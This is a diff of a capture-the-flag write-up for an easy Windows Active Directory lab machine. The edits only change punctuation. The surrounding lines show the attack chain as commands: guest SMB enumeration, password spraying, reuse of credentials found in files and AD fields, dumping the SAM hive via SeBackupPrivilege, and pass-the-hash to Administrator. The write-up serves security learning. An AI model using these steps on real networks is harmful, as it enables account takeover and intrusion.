@@ -4,7 +4,7 @@ date: 2025-10-03
 tags: [windows, active-directory, smb, password-spray, SeBackupPrivilege, pass-the-hash]
 difficulty: easy
 platform: HTB
-description: "Beginner-friendly Windows AD box — anonymous SMB enumeration leads to default credentials, password spraying finds a foothold, and SeBackupPrivilege escalates to Administrator via SAM dump."
+description: "Beginner-friendly Windows AD box: anonymous SMB enumeration leads to default credentials, password spraying finds a foothold, and SeBackupPrivilege escalates to Administrator via SAM dump."
 featured: false
 ---
 
@@ -79,7 +79,7 @@ echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
 
 ## Enumeration
 
-### SMB — Anonymous Access
+### SMB: Anonymous Access
 
 Try without credentials first:
 
@@ -87,7 +87,7 @@ Try without credentials first:
 crackmapexec smb cicada.htb --shares
 ```
 
-![Anonymous SMB — access denied](/images/writeups/cicada/1.png)
+![Anonymous SMB: access denied](/images/writeups/cicada/1.png)
 
 Denied. Try guest:
 
@@ -95,7 +95,7 @@ Denied. Try guest:
 crackmapexec smb cicada.htb -u guest -p '' --shares
 ```
 
-![Guest login — HR share readable](/images/writeups/cicada/2.png)
+![Guest login: HR share readable](/images/writeups/cicada/2.png)
 
 Guest has READ on `HR`. Connect with smbclient:
 
@@ -160,7 +160,7 @@ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
 
 ![lookupsid output](/images/writeups/cicada/4.png)
 
-That's a lot of output. At the bottom we can already see some users — but to make sure we have all of them, we run it again and filter to only `SidTypeUser` entries, then strip everything except the usernames with `sed`, and pipe into `users.txt`:
+That's a lot of output. At the bottom we can already see some users, but to make sure we have all of them, we run it again and filter to only `SidTypeUser` entries, then strip everything except the usernames with `sed`, and pipe into `users.txt`:
 
 Filter to just user accounts and save:
 
@@ -180,7 +180,7 @@ Spray the default password against every user:
 crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
 
-![Password spray — michael.wrightson hits](/images/writeups/cicada/6.png)
+![Password spray: michael.wrightson hits](/images/writeups/cicada/6.png)
 
 `michael.wrightson` never changed the default password.
 
@@ -196,7 +196,7 @@ No new shares. But we can use his credentials to enumerate all users and their A
 crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 ```
 
-![AD users — david.orelious has password in description](/images/writeups/cicada/8.png)
+![AD users: david.orelious has password in description](/images/writeups/cicada/8.png)
 
 `david.orelious` has his password stored in the AD description field: `aRt$Lp#7t*VQ!3`
 
@@ -220,7 +220,7 @@ Connect and list:
 smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
 ```
 
-![DEV share — Backup_script.ps1 found](/images/writeups/cicada/10.png)
+![DEV share: Backup_script.ps1 found](/images/writeups/cicada/10.png)
 
 Download the script:
 
@@ -244,7 +244,7 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-Emily's credentials are hardcoded in the script — a classic mistake when automation scripts are left in shared locations.
+Emily's credentials are hardcoded in the script, a classic mistake when automation scripts are left in shared locations.
 
 ### WinRM as Emily
 
@@ -254,7 +254,7 @@ Confirm Emily has `ADMIN$` access:
 crackmapexec smb cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
 ```
 
-![Emily — ADMIN$ access confirmed](/images/writeups/cicada/11.png)
+![Emily: ADMIN$ access confirmed](/images/writeups/cicada/11.png)
 
 Log in via WinRM:
 
@@ -273,7 +273,7 @@ cat user.txt
 
 ---
 
-## Privilege Escalation — SeBackupPrivilege
+## Privilege Escalation: SeBackupPrivilege
 
 ```bash
 whoami /priv
@@ -281,7 +281,7 @@ whoami /priv
 
 ![SeBackupPrivilege enabled](/images/writeups/cicada/priv.png)
 
-`SeBackupPrivilege` lets you read any file on the system, bypassing ACLs — including the SAM and SYSTEM registry hives which contain local password hashes.
+`SeBackupPrivilege` lets you read any file on the system, bypassing ACLs, including the SAM and SYSTEM registry hives which contain local password hashes.
 
 ```powershell
 reg save hklm\sam sam
@@ -308,7 +308,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up...
 ```
 
-A lot of information, but we only want the `Administrator` NTLM hash — that's the last segment of the line: `2b87e7c93a3e8a0ea4a581937016f341`
+A lot of information, but we only want the `Administrator` NTLM hash. That's the last segment of the line: `2b87e7c93a3e8a0ea4a581937016f341`
 
 ### Pass-the-Hash
 
@@ -322,10 +322,10 @@ evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
 
 ## Lessons Learned
 
-- Always try anonymous and guest SMB access — HR shares often hold sensitive onboarding docs
-- AD description fields are frequently abused for credential storage — always enumerate with `--users`
+- Always try anonymous and guest SMB access, HR shares often hold sensitive onboarding docs
+- AD description fields are frequently abused for credential storage, always enumerate with `--users`
 - Default passwords stick: spray them against all users, not just the one they were issued to
-- `SeBackupPrivilege` is a direct path to NTLM hashes via SAM/SYSTEM — treat it like local admin
+- `SeBackupPrivilege` is a direct path to NTLM hashes via SAM/SYSTEM, treat it like local admin
 
 ## References
 
